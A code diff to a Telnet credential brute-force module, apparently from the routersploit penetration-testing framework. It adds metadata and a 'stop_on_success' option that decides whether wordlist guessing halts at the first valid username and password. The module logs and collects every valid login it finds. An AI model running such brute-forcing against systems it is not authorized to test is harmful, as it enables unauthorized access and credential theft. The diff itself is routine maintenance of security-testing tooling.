@@ -22,7 +22,17 @@ class Exploit(exploits.Exploit):
     """
     __info__ = {
         'name': 'Telnet Bruteforce',
-        'author': 'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
+        'description': 'Module performs bruteforce attack against Telnet service. '
+                       'If valid credentials are found, they are displayed to the user.',
+        'authors': [
+            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
+        ],
+        'references': [
+            '',
+        ],
+        'devices': [
+            'Multi',
+        ],
     }
 
     target = exploits.Option('', 'Target IP address or file with target:port (file://)')
@@ -32,6 +42,7 @@ class Exploit(exploits.Exploit):
     usernames = exploits.Option('admin', 'Username or file with usernames (file://)')
     passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')
     verbosity = exploits.Option('yes', 'Display authentication attempts')
+    stop_on_success = exploits.Option('yes', 'Stop on first valid authentication attempt')
 
     credentials = []
 
@@ -100,7 +111,9 @@ class Exploit(exploits.Exploit):
                             print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
                         else:
                             if any(map(lambda x: x in res, ["#", "$", ">"])) or len(res) > 500:  # big banner e.g. mikrotik
-                                running.clear()
+                                if boolify(self.stop_on_success):
+                                    running.clear()
+
                                 print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
                                 self.credentials.append((self.target, self.port, user, password))
                         tn.close()
